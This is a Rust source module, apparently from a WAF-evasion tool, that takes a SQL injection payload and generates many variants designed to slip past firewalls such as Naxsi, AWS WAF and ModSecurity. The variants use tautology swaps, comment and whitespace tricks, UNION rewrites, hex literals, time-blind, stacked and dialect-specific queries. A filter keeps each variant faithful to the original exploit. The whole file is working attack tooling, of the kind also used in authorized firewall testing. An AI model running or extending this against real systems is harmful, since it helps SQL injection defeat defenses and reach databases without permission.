//! SQL grammar-aware payload mutation.
//!
//! Understands SQL semantics and generates equivalent queries that look
//! different to regex-based WAF rules while preserving behavior.

/// AST-level SQL metamorphism (sqlparser lift -> transform -> lower).
pub mod ast_metamorph;
/// Blind and time-based SQL mutation helpers.
pub mod blind;
/// Comment-based SQL mutation helpers.
pub mod comments;
/// Shared SQL mutation types and helpers.
pub mod common;
/// Keyword-free SQL mutation helpers for high-paranoia WAF bypass.
pub mod keywordless;
/// MSSQL dialect mutations.
pub mod mssql;
/// MySQL dialect mutations.
pub mod mysql;
/// Operator and delimiter SQL mutation helpers.
pub mod operators;
/// Oracle dialect mutations.
pub mod oracle;
/// PostgreSQL dialect mutations.
pub mod postgres;
/// Quote-free / comment-free rewrites for high-paranoia WAFs (Naxsi,
/// AWS WAF managed, modsec PL3+).
pub mod quote_free;
/// SQLite dialect mutations.
pub mod sqlite;
/// String and whitespace SQL mutation helpers.
pub mod strings;
/// Tautology SQL mutation helpers.
pub mod tautology;
/// UNION-specific SQL mutation helpers.
pub mod union;

pub use common::SqlMutation;
use wafrift_types::hash::{FNV_OFFSET_64, FNV_PRIME_64};

use crate::grammar::sql::blind::{
    boolean_blind_mutations, error_blind_mutations, json_xml_mutations, order_by_probes,
    stacked_query_mutations, time_blind_mutations,
};
use crate::grammar::sql::comments::{
    keyword_comment_mutations, nested_comment_mutations, version_comment_mutations,
};
use crate::grammar::sql::common::{
    COMMENT_TERMINATORS, WHITESPACE_ALTERNATIVES, and_alternatives, equality_alternatives,
    extract_quoted_string, or_alternatives,
};
use crate::grammar::sql::keywordless::keywordless_mutations;
use crate::grammar::sql::operators::{
    replace_comment_terminator, replace_equality, replace_logical_operator,
};
use crate::grammar::sql::strings::{hex_literal, no_space_wrap, split_string_concat};
use crate::grammar::sql::tautology::{TAUTOLOGIES, contains_tautology, replace_tautology};
use crate::grammar::sql::union::{
    UNION_ALTERNATIVES, replace_union, union_column_probes, union_mutations,
};

#[cfg(test)]
mod tests;

/// Generate grammar-aware mutations of a SQL injection payload.
#[allow(clippy::too_many_lines)]
#[must_use]
pub fn mutate(payload: &str, max_mutations: usize) -> Vec<SqlMutation> {
    if payload.is_empty() || max_mutations == 0 {
        return Vec::new();
    }

    // §1 SPEED: pre-size to the max mutation count to avoid reallocs
    // as mutation groups are extended. `max_mutations` is a tight upper
    // bound on the final len so the capacity is never wasted.
    let mut results = Vec::with_capacity(max_mutations);
    let lower = payload.to_ascii_lowercase();

    // Priority 1: quote-free / comment-free rewrites (Naxsi, AWS WAF
    // managed, modsec PL3+). Promoted ABOVE keywordless because high-
    // paranoia WAFs flag the math-only operator forms keywordless emits
    // (`1-1`, `+1+`) just as aggressively as quoted SQL — but they
    // pass clean integer-comparison forms (`1 OR 1=1`, `1 IS NOT NULL`)
    // through. Live-confirmed against wafrift-bench naxsi.
    extend_until_limit(
        &mut results,
        max_mutations,
        quote_free::mutations(payload, max_mutations / 3),
    );

    // Priority 2: keyword-free mutations (bypass PL2 WAFs).
    extend_until_limit(
        &mut results,
        max_mutations,
        keywordless_mutations(payload, max_mutations / 4),
    );

    // AST-level metamorphism: lift -> transform -> lower via sqlparser.
    // Yields semantic-identical fragments with different text signatures.
    extend_until_limit(
        &mut results,
        max_mutations,
        ast_metamorph::mutations(payload, max_mutations / 4),
    );

    if contains_tautology(payload) {
        for tautology in TAUTOLOGIES {
            if results.len() >= max_mutations {
                break;
            }

            if let Some(mutated) = replace_tautology(payload, tautology)
                && mutated != payload
            {
                results.push(SqlMutation {
                    payload: mutated,
                    description: format!("tautology → {tautology}"),
                    rules_applied: vec!["tautology_swap"],
                });
            }
        }
    }

    for comment in COMMENT_TERMINATORS {
        if results.len() >= max_mutations {
            break;
        }

        if let Some(mutated) = replace_comment_terminator(payload, comment)
            && mutated != payload
        {
            results.push(SqlMutation {
                payload: mutated,
                description: format!("comment → {comment}"),
                rules_applied: vec!["comment_swap"],
            });
        }
    }

    push_logical_operator_mutation(
        &mut results,
        payload,
        max_mutations,
        or_alternatives(),
        "or",
        "OR",
    );
    push_logical_operator_mutation(
        &mut results,
        payload,
        max_mutations,
        and_alternatives(),
        "and",
        "AND",
    );

    for whitespace in &WHITESPACE_ALTERNATIVES[1..] {
        if results.len() >= max_mutations {
            break;
        }

        let mutated = payload.replace(' ', whitespace);
        if mutated != payload {
            results.push(SqlMutation {
                payload: mutated,
                description: format!("whitespace → {whitespace:?}"),
                rules_applied: vec!["whitespace_swap"],
            });
        }
    }

    if lower.contains("union") && lower.contains("select") {
        for union_alternative in UNION_ALTERNATIVES {
            if results.len() >= max_mutations {
                break;
            }

            if let Some(mutated) = replace_union(payload, union_alternative)
                && mutated != payload
            {
                results.push(SqlMutation {
                    payload: mutated,
                    description: format!("UNION → {union_alternative}"),
                    rules_applied: vec!["union_swap"],
                });
            }
        }
    }

    for equality_alternative in equality_alternatives() {
        if results.len() >= max_mutations {
            break;
        }

        if let Some(mutated) = replace_equality(payload, equality_alternative)
            && mutated != payload
        {
            results.push(SqlMutation {
                payload: mutated,
                description: format!("= → {}", equality_alternative.trim()),
                rules_applied: vec!["equality_swap"],
            });
        }
    }

    if let Some(string_value) = extract_quoted_string(payload) {
        push_string_mutations(&mut results, payload, max_mutations, &string_value);
    }

    push_comment_keyword_mutations(&mut results, payload, max_mutations);

    if results.len() < max_mutations
        && let Some(string_value) = extract_quoted_string(payload)
    {
        let hex = hex_literal(&string_value);
        let mutated = payload.replace(&format!("'{string_value}'"), &hex);
        if mutated != payload {
            results.push(SqlMutation {
                payload: mutated,
                description: format!("hex literal: '{string_value}' → {hex}"),
                rules_applied: vec!["hex_literal"],
            });
        }
    }

    if results.len() < max_mutations
        && let Some(mutated) = no_space_wrap(payload)
    {
        results.push(SqlMutation {
            payload: mutated,
            description: "no-space: parenthesis wrapping instead of spaces".to_string(),
            rules_applied: vec!["no_space"],
        });
    }

    if lower.contains("order by") || lower.contains("union") {
        for probe in order_by_probes(10) {
            if results.len() >= max_mutations {
                break;
            }

            results.push(SqlMutation {
                payload: probe.clone(),
                description: format!("ORDER BY probe: {probe}"),
                rules_applied: vec!["order_by_probe"],
            });
        }
    }

    push_combined_whitespace_mutations(&mut results, max_mutations, payload);
    extend_until_limit(
        &mut results,
        max_mutations,
        time_blind_mutations(payload, max_mutations),
    );
    extend_until_limit(
        &mut results,
        max_mutations,
        stacked_query_mutations(payload, max_mutations),
    );

    if results.len() < max_mutations
        && let Some(string_value) = extract_quoted_string(payload)
    {
        push_postgres_quote_mutations(&mut results, payload, max_mutations, &string_value);
    }

    extend_until_limit(
        &mut results,
        max_mutations,
        json_xml_mutations(max_mutations),
    );
    extend_until_limit(
        &mut results,
        max_mutations,
        boolean_blind_mutations(payload, max_mutations),
    );
    extend_until_limit(
        &mut results,
        max_mutations,
        error_blind_mutations(payload, max_mutations),
    );
    extend_until_limit(
        &mut results,
        max_mutations,
        union_mutations(payload, max_mutations),
    );
    // Nested comment mutations — defeats WAFs that strip one comment layer
    for (mutated, desc) in nested_comment_mutations(payload, max_mutations) {
        if results.len() >= max_mutations {
            break;
        }
        results.push(SqlMutation {
            payload: mutated,
            description: desc,
            rules_applied: vec!["nested_comment"],
        });
    }
    // UNION column probes (only if payload contains UNION)
    if lower.contains("union") {
        extend_until_limit(&mut results, max_mutations, union_column_probes(10));
    }

    // Dialect-specific mutations — always reserve at least 20% of budget.
    // Use an extended limit so dialect mutations always get included.
    let dialect_limit = max_mutations + max_mutations / 5;
    let per_dialect = (max_mutations / 5).max(5);
    if per_dialect > 0 {
        extend_strings_until_limit(
            &mut results,
            dialect_limit,
            mysql::mutate(payload, per_dialect),
            "mysql",
        );
        extend_strings_until_limit(
            &mut results,
            dialect_limit,
            postgres::mutate(payload, per_dialect),
            "postgres",
        );
        extend_strings_until_limit(
            &mut results,
            dialect_limit,
            mssql::mutate(payload, per_dialect),
            "mssql",
        );
        extend_strings_until_limit(
            &mut results,
            dialect_limit,
            oracle::mutate(payload, per_dialect),
            "oracle",
        );
        extend_strings_until_limit(
            &mut results,
            dialect_limit,
            sqlite::mutate(payload, per_dialect),
            "sqlite",
        );
    }

    // ── Anti-rig chokepoint ──────────────────────────────────────────
    // A "mutation" of an attack must still BE that attack. Several
    // generators (json_xml, keywordless, canned-tautology, …) emit
    // fixed library payloads with ZERO relation to the input — so a
    // request to evade `1 AND extractvalue(...)` came back as
    // `' OR JSON_EXTRACT('{"a":1}','$.a')=1--`. That destroys the
    // exploit and is exactly what made the bench report fake bypasses.
    //
    // For a boolean tautology, a canned tautology IS equivalent — skip
    // the filter there (adversarial-twin: legit keyword-free rewrites
    // must survive). For any structured attack (UNION / error-based /
    // stacked / blind / time), every returned variant MUST still carry
    // at least one significant token of the original — checked after
    // stripping SQL comments + whitespace so legitimate
    // comment-injection evasions (`extr/**/actvalue`) still pass.
    //
    // §1 SPEED: strip_sql_comments_ws(payload) is now called ONCE and
    // shared between is_structured_attack and significant_tokens — the
    // old code called it twice for every structured payload.
    {
        let stripped_payload = strip_sql_comments_ws(payload);
        if is_structured_attack_stripped(&stripped_payload) {
            let markers = significant_tokens(&stripped_payload);
            if !markers.is_empty() {
                results.retain(|m| {
                    let norm = strip_sql_comments_ws(&m.payload);
                    let var_tokens: std::collections::HashSet<String> = norm
                        .split(|c: char| !c.is_ascii_alphanumeric())
                        .filter(|t| t.len() >= 4)
                        .map(str::to_ascii_lowercase)
                        .collect();
                    markers.iter().any(|mk| var_tokens.contains(mk))
                });
            }
        }
    }

    // Final truncate: dialect mutations are allowed to extend beyond base
    // budget during collection so each dialect gets a fair share, but the
    // public contract promises at most `max_mutations` results.
    results.truncate(max_mutations);
    results
}

/// STRUCTURED attack token set — the canonical single copy, shared by both
/// `is_structured_attack` and `is_structured_attack_stripped` via delegation.
/// §7 DEDUP: one definition, two callers.
const STRUCTURED_TOKENS: &[&str] = &[
    "union",
    "select",
    "sleep(",
    "benchmark(",
    "waitfor",
    "extractvalue",
    "updatexml",
    "load_file",
    "into outfile",
    "into dumpfile",
    ";",
    "insert ",
    "update ",
    "delete ",
    "drop ",
    "exec ",
    "xp_",
    "sp_",
    "pg_sleep",
    "dbms_",
    "utl_",
    "case when",
    "regexp ",
    "rlike ",
    "@@",
    "0x",
    "char(",
    "chr(",
    "concat",
    "ascii(",
    "substring",
    "substr(",
    "hex(",
    "unhex(",
    "if(",
    "floor(",
    "rand(",
    "count(",
    "group by",
    "having ",
    "procedure ",
];

/// Internal variant operating on an already-lowercased-and-stripped string.
///
/// Called from the anti-rig gate in `mutate()` where the stripped form is
/// shared between the structured-attack test and `significant_tokens`, saving
/// one `strip_sql_comments_ws` allocation per call.
///
/// §1 SPEED: `strip_sql_comments_ws(payload)` is called ONCE in the anti-rig gate
/// and reused — old code called it twice (once per fn) for every structured payload.
fn is_structured_attack_stripped(s: &str) -> bool {
    STRUCTURED_TOKENS.iter().any(|m| s.contains(m))
}

/// True when the payload is a STRUCTURED attack: it has a data-
/// exfiltration or secondary effect (UNION read, error-based extract,
/// time/boolean blind, stacked statement, file/proc access) — NOT just
/// "make the WHERE true".
///
/// This is the axis that matters for the anti-rig gate. A pure boolean
/// tautology or an `'admin'--` auth bypass CAN be swapped for an
/// equivalent always-true expression (same effect) — that is a valid
/// mutation. A structured attack CANNOT: replacing `extractvalue(...)`
/// or `UNION SELECT pw` with `1 OR 1=1` throws the exploit away. So:
///   * structured  → forbid canned substitution, enforce token
///     preservation (the variant must still be THIS attack);
///   * not structured → canned/keyword-free tautology rewrites are
///     legitimate equivalents, no preservation filter.
///
/// The old `contains_tautology` substring check got this exactly wrong:
/// `1 AND IF(1=1,SLEEP(5),0)` (time-blind) "contained `1=1`" so it was
/// treated as a tautology and its payload replaced by `'+0+'`.
pub(crate) fn is_structured_attack(payload: &str) -> bool {
    let s = strip_sql_comments_ws(payload);
    is_structured_attack_stripped(&s)
}

/// Significant lowercase tokens (alphanumeric runs ≥ 4 chars) of a
/// payload — the attack's class-defining vocabulary
/// (`extractvalue`, `union`, `select`, `concat`, `sleep`, …). A real
/// evasion preserves at least one; a canned substitution carries none.
///
/// §1 SPEED: accepts a pre-stripped string to avoid calling strip_sql_comments_ws
/// twice (once in is_structured_attack, once here) on the same payload. The caller
/// in `mutate()` that uses both passes the stripped form directly.
fn significant_tokens(stripped: &str) -> std::collections::HashSet<String> {
    stripped
        .split(|c: char| !c.is_ascii_alphanumeric())
        .filter(|t| t.len() >= 4 && t.chars().any(|c| c.is_ascii_alphabetic()))
        .map(str::to_ascii_lowercase)
        .collect()
}

/// Lowercased copy with SQL comments removed and whitespace collapsed,
/// so comment-injection evasions (`UN/**/ION`, `sel--\nect`) normalise
/// back to the keyword they evade rather than reading as a new token.
///
/// §1 SPEED: single-pass implementation — bytes are lowercased inline as they
/// are pushed to `out`, avoiding the old two-pass approach (build ASCII string
/// byte-by-byte then call `out.to_ascii_lowercase()` on the whole allocation).
/// For a 70-byte payload the old code allocated one 70-byte String then created
/// a second 70-byte lowercased clone; the new path writes lowercase directly.
fn strip_sql_comments_ws(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let b = s.as_bytes();
    let mut i = 0;
    while i < b.len() {
        if i + 1 < b.len() && b[i] == b'/' && b[i + 1] == b'*' {
            // Skip /* … */ (including /*! … */ MySQL conditional).
            i += 2;
            while i + 1 < b.len() && !(b[i] == b'*' && b[i + 1] == b'/') {
                i += 1;
            }
            i += 2;
        } else if (b[i] == b'-' && i + 1 < b.len() && b[i + 1] == b'-') || b[i] == b'#' {
            // line comment (`-- …` or `# …`) — skip to newline.
            while i < b.len() && b[i] != b'\n' {
                i += 1;
            }
        } else {
            // Inline lowercase — eliminates the second `to_ascii_lowercase()` pass.
            out.push(b[i].to_ascii_lowercase() as char);
            i += 1;
        }
    }
    out
}

fn extend_strings_until_limit(
    results: &mut Vec<SqlMutation>,
    max_mutations: usize,
    strings: Vec<String>,
    dialect: &'static str,
) {
    for s in strings {
        if results.len() >= max_mutations {
            break;
        }
        results.push(SqlMutation {
            payload: s,
            description: format!("{dialect} dialect mutation"),
            rules_applied: vec![dialect],
        });
    }
}

fn push_logical_operator_mutation(
    results: &mut Vec<SqlMutation>,
    payload: &str,
    max_mutations: usize,
    alternatives: &[String],
    target: &str,
    label: &str,
) {
    if let Some(mutated) = replace_logical_operator(payload, alternatives, target)
        && results.len() < max_mutations
        && mutated != payload
    {
        results.push(SqlMutation {
            payload: mutated,
            description: format!("{label} keyword alternative"),
            rules_applied: vec!["logical_op_swap"],
        });
    }
}

fn push_string_mutations(
    results: &mut Vec<SqlMutation>,
    payload: &str,
    max_mutations: usize,
    string_value: &str,
) {
    for split in split_string_concat(string_value) {
        if results.len() >= max_mutations {
            break;
        }

        results.push(SqlMutation {
            payload: payload.replace(&format!("'{string_value}'"), &split),
            description: format!("string split: '{string_value}' → {split}"),
            rules_applied: vec!["string_split"],
        });
    }
}

fn push_comment_keyword_mutations(
    results: &mut Vec<SqlMutation>,
    payload: &str,
    max_mutations: usize,
) {
    for (mutated, description) in keyword_comment_mutations(payload, max_mutations - results.len())
    {
        if results.len() >= max_mutations {
            break;
        }

        results.push(SqlMutation {
            payload: mutated,
            description,
            rules_applied: vec!["mysql_conditional"],
        });
    }

    for (mutated, description) in version_comment_mutations(payload, max_mutations - results.len())
    {
        if results.len() >= max_mutations {
            break;
        }

        results.push(SqlMutation {
            payload: mutated,
            description,
            rules_applied: vec!["mysql_version_conditional"],
        });
    }
}

fn push_combined_whitespace_mutations(
    results: &mut Vec<SqlMutation>,
    max_mutations: usize,
    payload: &str,
) {
    if results.is_empty() || results.len() >= max_mutations {
        return;
    }

    // F143: pre-fix this used rand::thread_rng().gen_range so every
    // call to mutate() produced a different combined-whitespace
    // suffix on the SAME input — gene-bank replay was broken for
    // any winner that ended up in this branch. Same hazard fixed
    // in parameter_pollute (F114), whitespace_pad (F136),
    // space_to_random_blank (F140), replace_logical_operator
    // (F142). Derive both indices deterministically from
    // (payload + iteration) via FNV-1a so identical input emits
    // byte-identical mutations while still rotating across the
    // available bases and whitespace alternatives.
    let n_combined = (max_mutations - results.len()).min(5);
    let seed: u64 = payload.bytes().fold(FNV_OFFSET_64, |acc, b| {
        (acc ^ u64::from(b)).wrapping_mul(FNV_PRIME_64)
    });
    for iter in 0..n_combined {
        let mix = seed
            .wrapping_add(iter as u64)
            .wrapping_mul(FNV_PRIME_64);
        let base_index = (mix as usize) % results.len();
        let ws_range = WHITESPACE_ALTERNATIVES.len() - 1; // 1..len()
        let whitespace_index = 1 + ((mix.rotate_left(17) as usize) % ws_range);
        let base_payload = results[base_index].payload.clone();
        let combined = base_payload.replace(' ', WHITESPACE_ALTERNATIVES[whitespace_index]);
        if combined != base_payload {
            let mut rules = results[base_index].rules_applied.clone();
            rules.push("combined_whitespace");
            results.push(SqlMutation {
                payload: combined,
                description: format!(
                    "combined: {} + whitespace {:?}",
                    results[base_index].description, WHITESPACE_ALTERNATIVES[whitespace_index]
                ),
                rules_applied: rules,
            });
        }
    }
}

fn push_postgres_quote_mutations(
    results: &mut Vec<SqlMutation>,
    payload: &str,
    max_mutations: usize,
    string_value: &str,
) {
    if results.len() >= max_mutations {
        return;
    }
    let dollar_quoted = format!("$${string_value}$$");
    let mutated = payload.replace(&format!("'{string_value}'"), &dollar_quoted);
    if mutated != payload {
        results.push(SqlMutation {
            payload: mutated,
            description: format!("PG dollar-sign quoting: '{string_value}' → $${string_value}$$"),
            rules_applied: vec!["pg_dollar_quote"],
        });
    }

    if results.len() >= max_mutations {
        return;
    }
    let tagged = format!("$tag${string_value}$tag$");
    let mutated_tagged = payload.replace(&format!("'{string_value}'"), &tagged);
    if mutated_tagged != payload {
        results.push(SqlMutation {
            payload: mutated_tagged,
            description: format!(
                "PG tagged dollar-sign: '{string_value}' → $tag${string_value}$tag$"
            ),
            rules_applied: vec!["pg_dollar_quote_tagged"],
        });
    }
}

fn extend_until_limit(
    results: &mut Vec<SqlMutation>,
    max_mutations: usize,
    mutations: Vec<SqlMutation>,
) {
    for mutation in mutations {
        if results.len() >= max_mutations {
            break;
        }
        results.push(mutation);
    }
}
